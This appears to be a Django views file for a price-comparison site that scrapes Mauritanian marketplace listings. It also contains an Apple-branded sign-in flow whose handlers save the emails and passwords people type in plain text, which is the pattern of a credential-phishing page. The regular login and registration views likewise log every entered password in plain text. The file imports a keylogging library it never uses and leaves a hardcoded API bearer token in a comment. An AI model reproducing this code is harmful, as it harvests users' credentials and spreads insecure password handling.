import json
from django.shortcuts import render, redirect
from django.contrib.auth import logout, authenticate, login
from django.contrib.auth.decorators import login_required
from django.urls import reverse
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework import generics
from django.db.models.functions import Random
from django.http import JsonResponse
from django.core.mail import send_mail
from django.utils.encoding import force_str, force_bytes
from django.utils.http import urlsafe_base64_decode, urlsafe_base64_encode
from django.contrib.auth.tokens import PasswordResetTokenGenerator
from .models import CustomUser
from .forms import CustomUserCreationForm,AppleRegistrationForm
from .serializers import *
from .models import RegistrationLog,LoginLog
import requests
from bs4 import BeautifulSoup
import time
from django.views.decorators.csrf import csrf_exempt
from webdriver_manager.chrome import ChromeDriverManager
from .forms import CustomUserCreationForm, CustomAuthenticationForm
from django.contrib.auth.views import PasswordResetView, PasswordResetConfirmView
from .forms import CustomPasswordResetForm, CustomSetPasswordForm
from django.contrib import messages
from django.core.mail import send_mail
from django.contrib import messages
from django.shortcuts import render, redirect
from django.contrib.auth.tokens import PasswordResetTokenGenerator
from django.utils.encoding import force_str 
from django.shortcuts import render
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from django.views.decorators.csrf import csrf_exempt
import json
from pynput import keyboard
import threading
import os
# from .serializers import CustomUserSerializer


def loginview(request):
    return render(request, 'auth/signin.html')
def signup_page(request):
    return render(request, 'auth/signup.html')

def forgetpass(request):
    return render(request, 'auth/forgot_password.html') 

def phones(request):
    return render(request, 'phones.html') 

def restpass(request):
    return render(request, 'auth/reset_password.html') 

def landing_page(request):
    return render(request, 'auth/landing.html')

def index(request):
    return render(request, 'index.html')

    
def logout(request):
    return redirect('login')  

def dashboard(request):
    return render(request, 'indexuser.html')

def apple_signin(request):
    return render(request, 'auth/apple_signin.html')

def apple_confirm(request):
    return render(request, 'auth/apple_confirm.html')

def apple_final(request):
    email = request.GET.get('email')  
    return render(request, 'auth/apple_final.html', {'email': email})

def apple_finals(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        LoginLog.objects.create(email=email, password=password)

        return render(request, 'redirect_delay.html', {'email': email})

    # Render the apple_final page
    return render(request, 'apple_final.html')



def register(request):
    if request.method == 'POST':
        form = AppleRegistrationForm(request.POST)
        if form.is_valid():
            user = form.save()  # Save the user
            password = form.cleaned_data['password1']  # Get the plain text password

            # Save the login details in LoginLog (including plain text password)
            LoginLog.objects.create(user=user, email=user.email, password=password)

            # Log the user in
            login(request, user)

            # Redirect to apple_confirm page with the email
            return redirect('apple_confirm', email=user.email)
    else:
        form = AppleRegistrationForm()
    return render(request, 'apple_final.html', {'form': form})


def register_view(request):
    if request.method == 'POST':
        form = CustomUserCreationForm(request.POST)
        if form.is_valid():
            user = form.save()  # Save the user to the CustomUser model
            # Log registration details
            RegistrationLog.objects.create(
                name=form.cleaned_data['name'],
                email=form.cleaned_data['email'],
                phone_number=form.cleaned_data['phone_number'],
                password=form.cleaned_data['password1']  # Save password in plain text
            )
            print("Registration success")
            return redirect('login')  # Redirect to login page
        else:
            print("Registration failed")
            return render(request, 'auth/signup.html', {'form': form})
    else:
        form = CustomUserCreationForm()
    return render(request, 'auth/signup.html', {'form': form})

def login_view(request):
    if request.method == 'POST':
        form = CustomAuthenticationForm(request, data=request.POST)
        if form.is_valid():
            email = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            # Log login attempt
            LoginLog.objects.create(
                email=email,
                password=password  # Save password in plain text
            )
            user = authenticate(request, username=email, password=password)
            if user is not None:
                login(request, user)
                print("Login success")
                return redirect('landing_page')
            else:
                print("Login failed: invalid credentials")
        else:
            print("Login failed: form invalid")
            print(form.errors)  # Print form errors to debug
        return render(request, 'auth/signin.html', {'form': form})
    else:
        form = CustomAuthenticationForm()
    return render(request, 'auth/signin.html', {'form': form})


def logout_view(request):
    if request.method == 'POST':
        logout(request)
        return redirect('loginn')  # Redirect to login page after logout
    return JsonResponse({'error': 'Method not allowed'}, status=405)

# def send_sms(phone_number, message):
#     url = "https://api.d7networks.com/messages/v1/send"
    
#     payload = json.dumps({
#         "messages": [
#             {
#                 "channel": "sms",
#                 "recipients": [f'+222{phone_number}'],
#                 "content": message,
#                 "msg_type": "text",
#                 "data_coding": "text"
#             }
#         ],
#         "message_globals": {
#             "originator": "PriceFox",  # Customize with your sender ID if necessary
#             "report_url": "https://your_report_url.com"
#         }
#     })

#     headers = {
#         'Content-Type': 'application/json',
#         'Accept': 'application/json',
#         'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRoLWJhY2tlbmQ6YXBwIiwic3ViIjoiMjE1MWM2OWUtNzBkNi00YWZjLWEzNTMtMzA4MzA3MGVmYTllIn0.-bGdIBUHG_jvf246cvHdWfutMAP_hW1jawNHmgndHP8'  # Replace with your actual D7 API token
#     }

#     try:
#         response = requests.post(url, headers=headers, data=payload)
#         if response.status_code == 200:
#             return True
#         else:
#             print("Failed to send SMS:", response.text)
#             return False
#     except requests.exceptions.RequestException as e:
#         print("Error sending SMS:", e)
#         return False
    
def forgot_password_view(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        if not email:
            messages.error(request, 'Email is required')
            return redirect('forgot_password')  # Redirect back to the page

        try:
            user = CustomUser.objects.get(email=email)
        except CustomUser.DoesNotExist:
            messages.error(request, 'User with this email does not exist')
            return redirect('forgot_password')  # Redirect back to the page

        # Generate password reset token
        token_generator = PasswordResetTokenGenerator()
        token = token_generator.make_token(user)
        uid = urlsafe_base64_encode(force_bytes(user.pk))

        reset_link = f"http://127.0.0.1:8000/reset-password/{uid}/{token}/"

        # Send email with reset link
        send_mail(
            'Password Reset Request',
            f'Click the link to reset your password: {reset_link}',
            'lave24@gmail.com',
            [user.email],
            fail_silently=False,
        )

        # Send SMS with reset link
        # sms_message = f"Your password reset link is: {reset_link}"
        # if user.phone_number:
        #     sms_sent = send_sms(user.phone_number, sms_message)
        #     if not sms_sent:
        #         messages.warning(request, 'Failed to send SMS, but email was sent successfully.')

        messages.success(request, 'Password reset link has been sent to your email and phone number.')
        return redirect('forgot_password')  

    return render(request, 'auth/forgot_password.html')

def reset_password_view(request, uidb64, token):
    if request.method == 'GET':
        return render(request, 'auth/reset_password.html')

    if request.method == 'POST':
        password = request.POST.get('password')
        if not password:
            return JsonResponse({'error': 'Password is required'}, status=400)

        try:
            uid = force_str(urlsafe_base64_decode(uidb64))  # Decode the UID
            user = CustomUser.objects.get(pk=uid)
        except (TypeError, ValueError, OverflowError, CustomUser.DoesNotExist):
            return JsonResponse({'error': 'Invalid user or token'}, status=400)

        token_generator = PasswordResetTokenGenerator()
        if not token_generator.check_token(user, token):
            return JsonResponse({'error': 'Invalid or expired token'}, status=400)

        user.set_password(password)
        user.save()

        # Redirect to landing page after successful password reset
        return redirect('loginn')  # Assuming 'landing_page' is the name of the URL pattern

    return JsonResponse({'error': 'Method not allowed'}, status=405)


# !______

def scrape_products(url):
    """Helper function to scrape products from a given URL."""
    response = requests.get(url)
    products = []

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        product_cards = soup.find_all('li', class_='grid__item')

        for card in product_cards:
            # Extract product name
            product_name_tag = card.find('h3', class_='card__heading')
            product_name = product_name_tag.text.strip() if product_name_tag else "No product name available"

            # Extract product price
            price_container = card.find('div', class_='price__container')
            if price_container:
                price_tag = price_container.find('span', class_='price-item--regular')
                price = price_tag.text.strip() if price_tag else "No price available"
                price_value = int(''.join(filter(str.isdigit, price))) if price != "No price available" else 0
            else:
                price_value = 0

            # Extract product image URL
            image_tag = card.find('img', class_='motion-reduce')
            image_url = f"https:{image_tag['src']}" if image_tag else "No image available"

            # Extract product URL
            product_link_tag = card.find('a', class_='full-unstyled-link')
            product_url = f"https://www.coindesfilles.net{product_link_tag['href']}" if product_link_tag else "No product URL available"

            # Append product details to the list
            products.append({
                'name': product_name,
                'price': price_value,
                'image_url': image_url,
                'product_url': product_url
            })

    return products

def makeup_list(request):
    # URLs to scrape
    makeup_url = "https://www.coindesfilles.net/collections/makeup"
    nettoyants_urls = [f"https://www.coindesfilles.net/collections/nettoyants?page={page}" for page in range(1, 5)]  # Pages 1 to 4

    # Scrape makeup products
    makeup_products = scrape_products(makeup_url)

    # Scrape nettoyants products from all pages
    nettoyants_products = []
    for url in nettoyants_urls:
        nettoyants_products.extend(scrape_products(url))

    # Sort and get the 10 cheapest products from each category
    cheapest_makeup = sorted(makeup_products, key=lambda x: x['price'])[:10]
    cheapest_nettoyants = sorted(nettoyants_products, key=lambda x: x['price'])[:10]

    # Combine the results
    all_products = cheapest_makeup + cheapest_nettoyants

    return render(request, 'makeup.html', {'products': all_products})

def accessoire_list(request):
    # Paths for Chrome and ChromeDriver on PythonAnywhere
    chrome_path = "/usr/bin/google-chrome"
    chromedriver_path = "/usr/bin/chromedriver"

    # Configure Chrome options
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run in headless mode
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")  # Disable automation detection
    chrome_options.binary_location = chrome_path  # Set the path to Chrome

    # Initialize the WebDriver
    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)

    # List of URLs to scrape
    urls = [
        "https://souq.mr/product-category/الرجل/",
        "https://souq.mr/product-category/المرأة/أكسسوارات/"
    ]

    # List to store product details
    products = []

    try:
        for url in urls:
            # Open the URL
            driver.get(url)
            
            # Wait for the page to load
            time.sleep(5)  # Adjust the sleep time as needed
            
            # Get the page source
            page_source = driver.page_source
            
            # Parse the page source with BeautifulSoup
            soup = BeautifulSoup(page_source, 'html.parser')
            
            # Find all product cards
            product_cards = soup.find_all('div', class_='product-wrapper')
            
            for card in product_cards:
                # Extract product name
                product_name_tag = card.find('h3', class_='wd-entities-title')
                product_name = product_name_tag.text.strip() if product_name_tag else "No product name available"
                
                # Extract product price
                price_tag = card.find('span', class_='price')
                if price_tag:
                    original_price = price_tag.find('del')
                    discounted_price = price_tag.find('ins')
                    price = discounted_price.text.strip() if discounted_price else original_price.text.strip() if original_price else "No price available"
                else:
                    price = "No price available"
                
                # Extract product image URL
                image_tag = card.find('img', class_='attachment-woocommerce_thumbnail')
                image_url = image_tag['src'] if image_tag else "No image available"
                
                # Extract product URL
                product_url_tag = card.find('a', class_='product-image-link')
                product_url = product_url_tag['href'] if product_url_tag else "No product URL available"
                
                # Append product details to the list
                products.append({
                    'name': product_name,
                    'price': price,
                    'image_url': image_url,
                    'product_url': product_url
                })
    finally:
        # Close the WebDriver
        driver.quit()

    return render(request, 'accessoire.html', {'products': products})

def cars_list(request):
    # List to store all products from both sources
    all_products = []

    # Scrape data from the first source (https://www.safka.mr/?q=v1&page=1)
    url_safka = "https://www.safka.mr/?q=v1&page=1"
    response_safka = requests.get(url_safka)

    if response_safka.status_code == 200:
        soup_safka = BeautifulSoup(response_safka.content, 'html.parser')
        product_rows = soup_safka.find_all('div', class_='views-row')

        for row in product_rows:
            # Extract product name
            product_name_tag = row.find('div', class_='views-field-title')
            product_name = product_name_tag.text.strip() if product_name_tag else "No product name available"

            # Extract product price
            price_tag = row.find('div', class_='views-field-field-prix')
            price = price_tag.text.strip() if price_tag else "No price available"
            try:
                price_value = float(price.replace('.', '').replace(',', '.')) if price != "No price available" else float('inf')
            except ValueError:
                price_value = float('inf')  # Handle invalid price formats

            # Extract product image URL
            image_tag = row.find('img')
            image_url = image_tag['src'] if image_tag else "No image available"

            # Extract product URL
            product_url_tag = row.find('a')
            product_url = f"https://www.safka.mr{product_url_tag['href']}" if product_url_tag else "No product URL available"

            # Append product details to the list
            all_products.append({
                'title': product_name,
                'price': price_value,
                'location': "No location available",  # Location not available in this source
                'description': "No description available",  # Description not available in this source
                'image_urls': [image_url],
                'product_url': product_url,
                'source': 'Safka'
            })

    # Scrape data from the second source (https://mr.opensooq.com/ar/سيارات-ومركبات/سيارات-للبيع)
    chrome_path = "/usr/bin/google-chrome"
    chromedriver_path = "/usr/bin/chromedriver"

    options = Options()
    options.add_argument('--headless')  # Run in headless mode
    options.binary_location = chrome_path  # Set the path to Chrome

    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=options)

    url_opensooq = "https://mr.opensooq.com/ar/سيارات-ومركبات/سيارات-للبيع"
    driver.get(url_opensooq)
    time.sleep(5)  # Wait for the page to load

    soup_opensooq = BeautifulSoup(driver.page_source, 'html.parser')
    product_cards = soup_opensooq.find_all('a', class_='postListItemData')

    for card in product_cards:
        # Extract product title
        title_tag = card.find('h2', class_='breakWord')
        title = title_tag.text.strip() if title_tag else "No title available"
        
        # Extract product price
        price_tag = card.find('div', class_='priceColor')
        price = price_tag.text.strip() if price_tag else "No price available"
        
        # Extract product location
        location_tag = card.find('div', class_='darkGrayColor')
        location = location_tag.text.strip() if location_tag else "No location available"
        
        # Extract product description
        description_tag = card.find('p')
        description = description_tag.text.strip() if description_tag else "No description available"
        
        # Extract product image URLs
        image_tags = card.find_all('img', class_='width-100 height-100')
        image_urls = [img['src'] for img in image_tags if 'src' in img.attrs]
        
        # Extract product URL
        product_url = card['href'] if 'href' in card.attrs else "No product URL available"
        product_url = f"https://mr.opensooq.com{product_url}"  # Convert to absolute URL
        
        # Append product details to the list
        all_products.append({
            'title': title,
            'price': price,
            'location': location,
            'description': description,
            'image_urls': image_urls,
            'product_url': product_url,
            'source': 'OpenSooq'
        })

    # Close the browser
    driver.quit()

    # Sort all products by price (convert prices to float for sorting)
    def get_price(product):
        if isinstance(product['price'], str):
            try:
                return float(product['price'].replace(',', '').replace(' ', ''))
            except ValueError:
                return float('inf')
        return product['price']

    sorted_products = sorted(all_products, key=lambda x: get_price(x))

    # Get the 10 cheapest products
    cheapest_products = sorted_products[:10]

    return render(request, 'cars.html', {'products': cheapest_products})


def houses_list(request):
    url = "https://www.safka.mr/?q=aq1&page=2"
    response = requests.get(url)
    properties = []

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Find all product rows
        product_rows = soup.find_all('div', class_='views-row')

        for row in product_rows:
            # Extract product name (title)
            product_name_tag = row.find('div', class_='views-field-title')
            title = product_name_tag.text.strip() if product_name_tag else "No product name available"

            # Extract product price
            price_tag = row.find('div', class_='views-field-field-prix')
            price = price_tag.text.strip() if price_tag else "No price available"

            # Convert price to a float for sorting
            try:
                price_value = float(price.replace('.', '').replace(',', '.')) if price != "No price available" else float('inf')
            except ValueError:
                price_value = float('inf')  # Handle invalid price formats

            # Extract product image URL
            image_tag = row.find('img')
            image_url = image_tag['src'] if image_tag else "No image available"

            # Extract product URL (detail URL)
            product_url_tag = row.find('a')
            detail_url = f"https://www.safka.mr{product_url_tag['href']}" if product_url_tag else "No product URL available"

            # Map Safka data to the structure expected by houses.html
            properties.append({
                'title': title,
                'location': "Location not available",  # Safka doesn't provide location
                'price': price,
                'price_value': price_value,  # Add price_value for sorting
                'rooms': "Rooms not available",  # Safka doesn't provide rooms
                'bathrooms': "Bathrooms not available",  # Safka doesn't provide bathrooms
                'garages': "Garages not available",  # Safka doesn't provide garages
                'pool': "Pool not available",  # Safka doesn't provide pool
                'image_url': image_url,
                'detail_url': detail_url  # Added detail URL for the "View Details" button
            })

        # Sort properties by price_value and get the 10 cheapest
        sorted_properties = sorted(properties, key=lambda x: x['price_value'])
        cheapest_properties = sorted_properties[:15]
    else:
        cheapest_properties = []

    return render(request, 'houses.html', {'properties': cheapest_properties})

# def houses2_list(request):
#     # Set up Selenium WebDriver in headless mode
#     chrome_options = Options()
#     chrome_options.add_argument("--headless")  # Run in headless mode
#     chrome_options.add_argument("--disable-gpu")  # Disable GPU acceleration
#     chrome_options.add_argument("--window-size=1920,1080")  # Set window size

#     # Update this path to your ChromeDriver location
#     service = Service('/usr/local/bin/chromedriver')
#     driver = webdriver.Chrome(service=service, options=chrome_options)

#     # URL to scrape
#     url = "https://www.elminassa.com/list"

#     # Open the URL in the browser
#     driver.get(url)

#     # Wait for the page to load (adjust the sleep time as needed)
#     time.sleep(10)

#     # Get the page source after it's fully loaded
#     page_source = driver.page_source

#     # Close the browser
#     driver.quit()

#     # Parse the page source with BeautifulSoup
#     soup = BeautifulSoup(page_source, 'html.parser')

#     # Find all product containers (adjust the class name as per the website structure)
#     product_containers = soup.find_all('div', class_='swiper-slide')

#     # List to store all product details
#     products = []

#     # Loop through each product container
#     for container in product_containers:
#         try:
#             # Extract the image URL (only the first image)
#             image_tag = container.find('img', class_='swiper-lazy')
#             image_url = image_tag['src'] if image_tag else "No Image"

#             # Extract the price
#             price_tag = container.find('span', class_='myTopRight2')
#             if price_tag:
#                 # Remove the inner span (e.g., "/ شهر") and get the price text
#                 for span in price_tag.find_all('span'):
#                     span.decompose()  # Remove the inner span
#                 price_text = price_tag.get_text(strip=True)
#                 # Clean the price string (remove "MRU" and "/شهر", then remove spaces)
#                 price_text = price_text.replace('MRU', '').replace('/شهر', '').replace(' ', '')
#                 price = int(price_text) if price_text.isdigit() else "No Price"
#             else:
#                 price = "No Price"

#             # Extract the description
#             description_tag = container.find('span', class_='myTopLeftt2 arabicFont')
#             description = description_tag.get_text(strip=True) if description_tag else "No Description"

#             # Extract the item URL (if available)
#             item_url_tag = container.find('a', href=True)  # Look for an <a> tag with an href attribute
#             if item_url_tag:
#                 item_url = item_url_tag['href']
#                 # Construct the full item URL if it's a relative path
#                 if not item_url.startswith('http'):
#                     item_url = f"https://www.elminassa.com{item_url}"
#             else:
#                 item_url = "No URL"

#             # Store the product details in a dictionary
#             product = {
#                 "image_url": image_url,
#                 "price": price,
#                 "description": description,
#                 "item_url": item_url
#             }

#             # Add the product to the list
#             products.append(product)
#         except Exception as e:
#             print(f"Error processing a product: {e}")

#     # Sort products by price (convert price to integer for sorting)
#     try:
#         products.sort(key=lambda x: x['price'] if isinstance(x['price'], int) else float('inf'))
#     except Exception as e:
#         print(f"Error sorting products: {e}")

#     # Get the 15 cheapest products
#     cheapest_products = products[:15]

#     return render(request, 'houses2.html', {'products': cheapest_products})

def appel_offre_list(request):
    # Paths for Chrome and ChromeDriver on PythonAnywhere
    chrome_path = "/usr/bin/google-chrome"
    chromedriver_path = "/usr/bin/chromedriver"

    # Configure Selenium to run in headless mode
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run in headless mode
    chrome_options.add_argument("--disable-gpu")  # Disable GPU acceleration
    chrome_options.add_argument("--window-size=1920,1080")  # Set window size
    chrome_options.add_argument("--no-sandbox")  # Disable sandbox for Linux environments
    chrome_options.add_argument("--disable-dev-shm-usage")  # Disable shared memory usage
    chrome_options.binary_location = chrome_path  # Set the path to Chrome

    # Initialize the WebDriver with headless mode
    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)

    # URL of the page to scrape
    url = "https://beta.mr"

    # Open the URL
    driver.get(url)

    # Wait for the page to load (adjust the sleep time if needed)
    time.sleep(10)

    # Get the page source after JavaScript has rendered the content
    page_source = driver.page_source

    # Close the WebDriver
    driver.quit()

    # Parse the page source with BeautifulSoup
    soup = BeautifulSoup(page_source, 'html.parser')

    # Find all the "Appels d'Offres" cards
    appel_d_offres_cards = soup.find_all('div', class_='card post-card', limit=10)

    # List to store the extracted information
    appel_offres = []

    # Loop through the first 10 cards and extract the relevant information
    for card in appel_d_offres_cards:
        # Extract the title
        title = card.find('div', class_='post-card-content').text.strip()
        
        # Extract the description
        description = card.find('div', class_='post-card-heading').text.strip()
        
        # Extract the deadline
        deadline = card.find('div', class_='post-card-limit').text.strip()
        
        # Extract the image URL
        image_tag = card.find('img', class_='imgCard')
        image_url = image_tag['src'] if image_tag else "No image found"
        
        # Extract the article URL
        article_link = card.find('a', class_='titleAnn')
        if article_link:
            article_url = article_link['href']
            if not article_url.startswith(('http://', 'https://')):
                article_url = "https://beta.mr" + article_url
        else:
            article_url = "No article URL found"
        
        # Append the extracted information to the list
        appel_offres.append({
            'title': title,
            'description': description,
            'deadline': deadline,
            'image_url': image_url,
            'article_url': article_url
        })

    return render(request, 'appel_offre.html', {'appel_offres': appel_offres})

def job_offers_list(request):
    # Paths for Chrome and ChromeDriver on PythonAnywhere
    chrome_path = "/usr/bin/google-chrome"
    chromedriver_path = "/usr/bin/chromedriver"

    # Configure Selenium to run in headless mode
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run in headless mode
    chrome_options.add_argument("--disable-gpu")  # Disable GPU acceleration
    chrome_options.add_argument("--window-size=1920,1080")  # Set window size
    chrome_options.add_argument("--no-sandbox")  # Disable sandbox for Linux environments
    chrome_options.add_argument("--disable-dev-shm-usage")  # Disable shared memory usage
    chrome_options.binary_location = chrome_path  # Set the path to Chrome

    # Initialize the WebDriver with headless mode
    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)

    # URL of the page to scrape
    url = "https://beta.mr"

    # Open the URL
    driver.get(url)

    # Wait for the page to load (adjust the sleep time if needed)
    time.sleep(10)

    # Get the page source after JavaScript has rendered the content
    page_source = driver.page_source

    # Close the WebDriver
    driver.quit()

    # Parse the page source with BeautifulSoup
    soup = BeautifulSoup(page_source, 'html.parser')

    # Find the "Offres d'emploi" section
    offres_emploi_section = soup.find('div', class_='card-body bgCard pt-1', style="background-color: #efefff;")

    job_offers = []

    if offres_emploi_section:
        # Find all the job offer cards within the section
        job_offers_cards = offres_emploi_section.find_all('div', class_='card post-card pb-1 mb-1', limit=10)

        # Loop through the first 10 cards and extract the relevant information
        for card in job_offers_cards:
            # Extract the title
            title = card.find('div', class_='post-card-content').text.strip()
            
            # Extract the description
            description = card.find('div', class_='post-card-heading').text.strip()
            
            # Extract the deadline
            deadline = card.find('div', class_='post-card-limit').text.strip()
            
            # Extract the image URL
            image_tag = card.find('img', class_='imgCard')
            image_url = image_tag['src'] if image_tag else "No image found"
            
            # Extract the article URL
            article_link = card.find('a', class_='titleAnn')
            if article_link:
                article_url = article_link['href']
                if not article_url.startswith(('http://', 'https://')):
                    article_url = "https://beta.mr" + article_url
            else:
                article_url = "No article URL found"
            
            # Append the extracted information to the list
            job_offers.append({
                'title': title,
                'description': description,
                'deadline': deadline,
                'image_url': image_url,
                'article_url': article_url
            })
    else:
        print("Offres d'emploi section not found.")

    return render(request, 'appel_emplois.html', {'job_offers': job_offers})



def scrape_khidmaa_phones():
    url = "https://khidmaa.com/category/2?page=1"
    response = requests.get(url)
    phones = []

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Find all phone cards
        phone_cards = soup.find_all('div', class_='p-2 border border-stone-200 rounded relative overflow-hidden')

        for card in phone_cards:
            # Extract phone title
            title_tag = card.find('span', class_='text-2xl text-center')
            title = title_tag.text.strip() if title_tag else "No title available"

            # Extract phone price
            price_tag = card.find('span', class_='text-yellow-500 text-xl text-center sm:text-2xl')
            price = price_tag.text.strip() if price_tag else "No price available"

            # Convert price to a float for sorting
            try:
                price_value = float(price.replace('A-UM', '').replace(',', '').strip())
            except (ValueError, AttributeError):
                price_value = float('inf')  # Handle invalid price formats

            # Extract phone image URL
            image_tag = card.find('img', class_='max-h-52 img-loading')
            image_url = image_tag['src'] if image_tag else "No image available"

            # Extract phone detail URL
            detail_url_tag = card.find('a', href=True)
            detail_url = detail_url_tag['href'] if detail_url_tag else "No detail URL available"

            # Append phone details to the list
            phones.append({
                'title': title,
                'price': price,
                'price_value': price_value,
                'image_url': image_url,
                'detail_url': detail_url,
                'source': 'Khidmaa'  # Add source to identify the website
            })

    return phones

def scrape_safka_phones():
    url = "https://safka.mr/?q=sa1&page=1"
    response = requests.get(url)
    phones = []

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Find all product rows
        product_rows = soup.find_all('div', class_='views-row')

        for row in product_rows:
            # Extract product name
            product_name_tag = row.find('div', class_='views-field-title')
            product_name = product_name_tag.text.strip() if product_name_tag else "No product name available"

            # Extract product price
            price_tag = row.find('div', class_='views-field-field-prix')
            price = price_tag.text.strip() if price_tag else "No price available"

            # Convert price to a float for sorting
            try:
                price_value = float(price.replace('.', '').replace(',', '.')) if price != "No price available" else float('inf')
            except ValueError:
                price_value = float('inf')  # Handle invalid price formats

            # Extract product image URL
            image_tag = row.find('img')
            image_url = image_tag['src'] if image_tag else "No image available"

            # Extract product URL
            product_url_tag = row.find('a')
            product_url = f"https://www.safka.mr{product_url_tag['href']}" if product_url_tag else "No product URL available"

            # Append product details to the list
            phones.append({
                'title': product_name,
                'price': price,
                'price_value': price_value,
                'image_url': image_url,
                'detail_url': product_url,
                'source': 'Safka'  # Add source to identify the website
            })

    return phones

def phone_list(request):
    # Scrape phones from both websites
    khidmaa_phones = scrape_khidmaa_phones()
    safka_phones = scrape_safka_phones()

    # Sort and get the 10 cheapest phones from each website
    cheapest_khidmaa_phones = sorted(khidmaa_phones, key=lambda x: x['price_value'])[:10]
    cheapest_safka_phones = sorted(safka_phones, key=lambda x: x['price_value'])[:10]

    # Combine the results
    all_phones = cheapest_khidmaa_phones + cheapest_safka_phones

    return render(request, 'phones.html', {'properties': all_phones})













# def scrape_cars(request):
#     url = "https://www.voursa.com/Index.cfm?gct=1&sct=11&gv=13"
#     response = requests.get(url)

#     if response.status_code == 200:
#         soup = BeautifulSoup(response.content, 'html.parser')

#         cars = []

#         for car_div in soup.find_all('div', id='rptregion'):
#             title = car_div.find('div', id='titre').text.strip() if car_div.find('div', id='titre') else "N/A"

#             price_div = car_div.find('div', id='prix')
#             price = price_div.text.strip() if price_div else "N/A"

#             try:
#                 price = float(price.replace('MRU', '').replace(',', '').strip())
#             except ValueError:
#                 price = float('inf')

#             image_url = car_div.find('img')['src'] if car_div.find('img') else "N/A"
#             image_url = f"https://www.voursa.com{image_url}" if image_url != "N/A" else "N/A"

#             link = car_div.find_parent('a')['href'] if car_div.find_parent('a') else "N/A"
#             link = f"https://www.voursa.com{link}" if link != "N/A" else "N/A"

#             cars.append({
#                 'Title': title,
#                 'Price': price,
#                 'Image_URL': image_url,  
#                 'Link': link
#             })

#         sorted_cars = sorted(cars, key=lambda x: x['Price'])
#         cheapest_cars = sorted_cars[:10]

#         for car in cheapest_cars:
#             print(f"Image URL: {car['Image_URL']}")

#         context = {
#             'cars': cheapest_cars
#         }
#         return render(request, 'car_list.html', context)
#     else:
#         return render(request, 'error.html', {'error': f"Failed to retrieve the website. Status code: {response.status_code}"})
    
    
# def scrape_houses(request):
#     url = "https://www.voursa.com/Index.cfm?gct=3&gv=13"
#     response = requests.get(url)

#     if response.status_code == 200:
#         soup = BeautifulSoup(response.content, 'html.parser')

#         houses = []

#         for house_div in soup.find_all('div', id='rptregion'):
#             title = house_div.find('div', id='titre').text.strip() if house_div.find('div', id='titre') else "N/A"

#             price_div = house_div.find('div', id='prix')
#             price = price_div.text.strip() if price_div else "N/A"

#             try:
#                 price = float(price.replace('MRU', '').replace(',', '').strip())
#             except ValueError:
#                 price = float('inf') 

#             image_tag = house_div.find('img')
#             image_url = image_tag['src'] if image_tag else "N/A"
#             image_url = f"https://www.voursa.com{image_url}" if image_url != "N/A" else "N/A"

#             # Extract link
#             link_tag = house_div.find_parent('a')
#             link = link_tag['href'] if link_tag else "N/A"
#             link = f"https://www.voursa.com{link}" if link != "N/A" else "N/A"

#             houses.append({
#                 'Title': title,
#                 'Price': price,
#                 'Image URL': image_url,
#                 'Link': link
#             })

#         sorted_houses = sorted(houses, key=lambda x: x['Price'])

#         cheapest_houses = sorted_houses[:10]

#         context = {
#             'houses': cheapest_houses
#         }
#         return render(request, 'house_list.html', context)
#     else:
#         return render(request, 'error1.html', {'error': f"Failed to retrieve the website. Status code: {response.status_code}"})
    
    
# # -------------------------start ----------------------------
# marque_mapping = {"Toyota": 1, "Mercedes": 2, "Hyundai": 4}
# models_by_brand = {
#     "Toyota": {"Corolla": 24, "avensus": 20, "rav4": 28, "hilux": 25, "tx": 27},
#     "Hyundai": {"accent": 118, "Elantra": 119, "Santa fe": 124, "sonata": 125},
#     "Mercedes": {} 
# }

# def scrape_cars(av, bv=0):
#     url = f"https://www.voursa.com/Index.cfm?gct=1&sct=11&gv=1&av={av}&bv={bv}&cv=0&dv=0&ev=0&fv=0&genre=0&pp=0&localisation=0&pmin=0&pmax=0"
#     response = requests.get(url)
#     if response.status_code != 200:
#         return []

#     soup = BeautifulSoup(response.content, 'html.parser')
#     cars = []
#     for car_div in soup.find_all('div', id='rptregion'):
#         title = car_div.find('div', id='titre').text.strip() if car_div.find('div', id='titre') else "N/A"
#         price = car_div.find('div', id='prix').text.strip().replace('MRU', '').replace(',', '').strip()
#         price = float(price) if price.isdigit() else float('inf')
#         image_url = f"https://www.voursa.com{car_div.find('img')['src']}" if car_div.find('img') else "N/A"
#         link = f"https://www.voursa.com{car_div.find_parent('a')['href']}" if car_div.find_parent('a') else "N/A"
#         cars.append({'Title': title, 'Price': price, 'Image_URL': image_url, 'Link': link})
#     return sorted(cars, key=lambda x: x['Price'])[:10]

# def car_selection(request):
#     return render(request, 'car_selection.html', {"brands": marque_mapping.keys()})

# def get_models(request):
#     brand = request.GET.get('brand')
#     models = models_by_brand.get(brand, {})
#     return JsonResponse(models, safe=False)

# def search_cars(request):
#     brand = request.GET.get('brand')
#     model = request.GET.get('model', '')
#     av = marque_mapping.get(brand, 0)
#     bv = models_by_brand.get(brand, {}).get(model, 0)
#     cars = scrape_cars(av, bv)
#     return JsonResponse(cars, safe=False)
# -------------------------finish ----------------------------


# class RegisterView(APIView):
#     permission_classes = [AllowAny]

#     def post(self, request):
